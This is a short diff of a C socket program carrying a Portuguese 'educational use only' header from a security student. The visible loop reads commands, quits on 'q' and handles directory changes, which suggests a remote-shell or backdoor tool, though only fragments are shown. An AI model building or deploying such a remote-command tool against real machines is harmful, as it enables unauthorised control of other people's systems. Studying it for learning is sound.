@@ -1,3 +1,12 @@
+/*
+Criado por Jean(Kripto-Sec) estudante de segurança da informação
+Criado apenas para fins educativos não use pra beneficio proprio
+Apenas para estudo 
+github: https://github.com/Kripto-Sec
+bom estudo
+*/
+
+
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -46,7 +55,7 @@ int main()
         if (strncmp("q", buffer, 1) == 0){
             break;
 
-        }
+        }//comando para mudar de diretorio tem que add um espaco
         else if(strncmp("cd ", buffer, 3) == 0){
             goto jump;
         }
